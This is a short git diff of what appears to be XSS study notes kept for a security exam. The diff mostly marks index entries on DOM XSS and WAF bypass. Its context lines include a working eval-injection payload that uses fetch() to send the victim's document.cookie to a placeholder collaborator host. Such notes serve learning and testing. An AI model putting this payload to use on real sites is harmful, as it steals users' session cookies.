@@ -25,8 +25,8 @@
 - [XSS Reflected - how to find tags and attributed blocked and WAF bypass](tags-and-attributed-blockec-waf-bypass.md) 👀
  
 - [DOM XSS in document.write sink using source location.search - SVG TAG](dom-xss-sink-source-svg.md)
-- [DOM XSS in jQuery using onhashchange event # ](dom-xss-jquery-onhashchange.md)
-- [DOM XSS documentwirte sink + location.search sources -> closing select tag](dom-xss-documentwrite-select-tag.md)
+- [DOM XSS in jQuery using onhashchange event # ](dom-xss-jquery-onhashchange.md) 🔥
+- [DOM XSS documentwirte sink + location.search sources -> closing select tag](dom-xss-documentwrite-select-tag.md) 🔥
 - [DOM XSS Reflected - eval() + json format without JSON.parse()](dom-xss-reflected-eval-json-escape.md)
 
 
@@ -111,7 +111,7 @@ javascript:alert(0)
 
 // json format in response injected in eval() without JSON.parse == string
 // eval() function it's a dangerous function that takes a string and execute it as javascript code
-// the server scape " with \ so scape with another \ close } and comment with //
+// the server scape " with \ so scape with another \ close } and comment with comment with javascript comment (//)
 // adapt the payload in the exam depending of the parser
 \"-fetch('https://<COLLABORATOR>?cookie='+btoa(document.cookie))}//
 
